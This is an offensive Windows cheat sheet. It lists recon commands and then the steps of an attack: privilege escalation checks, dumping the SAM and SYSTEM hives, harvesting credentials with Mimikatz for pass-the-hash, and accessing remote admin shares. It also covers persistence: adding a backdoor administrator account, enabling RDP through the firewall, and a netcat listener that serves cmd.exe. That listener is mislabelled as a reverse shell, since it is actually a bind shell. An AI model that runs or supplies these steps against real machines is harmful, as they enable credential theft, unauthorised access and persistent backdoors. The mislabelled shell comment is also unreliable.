## Basic Windows Commands

| Command | Description |
|---------|------------|
| `whoami` | Shows current logged-in user. |
| `hostname` | Displays the computer name. |
| `systeminfo` | Shows OS version, patch level, and installed updates. |
| `net user` | Lists all local user accounts. |
| `net localgroup administrators` | Shows all admin users on the machine. |
| `tasklist` | Lists running processes. |
| `wmic qfe get Caption,Description,HotFixID` | Lists installed Windows updates (used for finding missing patches). |
| `ipconfig /all` | Shows network configuration, IP, MAC address. |
| `arp -a` | Displays ARP table (used to find connected devices). |
| `route print` | Shows routing table (useful for network recon). |

---

## Finding Vulnerabilities & Privilege Escalation

#### Check Current Privileges
```powershell
whoami /priv
```

#### Find Misconfigured Services (Privilege Escalation)
```powershell
wmic service get name,displayname,pathname | findstr /i "C:\Program"
```

#### Check Sudo-like Commands
```powershell
whoami /groups
net user <your_user> /domain
# If you have admin privileges, escalate to SYSTEM.
```

#### Find Running Services & Exploit Misconfigurations
```powershell
tasklist /svc
sc query
# Look for vulnerable services (unquoted paths, weak permissions).
```

## Password & Credential Dumping

#### Dump Password Hashes (If Admin)
```powershell
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

# Use Mimikatz to extract hashes:
mimikatz
sekurlsa::logonpasswords
# Use hashes in "Pass-the-Hash" attacks.
```

#### Extract Credentials from Registry
```powershell
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

## Network Scanning & Remote Exploitation

#### List Open Ports (Find Remote Services)
```powershell
netstat -ano
# Look for open RDP (3389), SMB (445), WinRM (5985).
```

#### Enumerate SMB (File Sharing Exploits)
```powershell
net use \\<target-IP>\C$ /user:Administrator
# Access admin shares remotely if credentials are known.
```

#### Connect to Remote Desktop (RDP)
```powershell
mstsc /v:<TARGET-IP>
# Use if RDP (port 3389) is open.
```

## Windows Persistence & Maintaining Access

#### Create a New Admin User
```powershell
net user hacker Pass123 /add
net localgroup administrators hacker /add
```

#### Enable RDP for Remote Access
```powershell
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="Remote Desktop" new enable=Yes
```

#### Add a Backdoor Using Netcat
```powershell
nc -lvp 4444 -e cmd.exe
# Creates a reverse shell on port 4444.
```
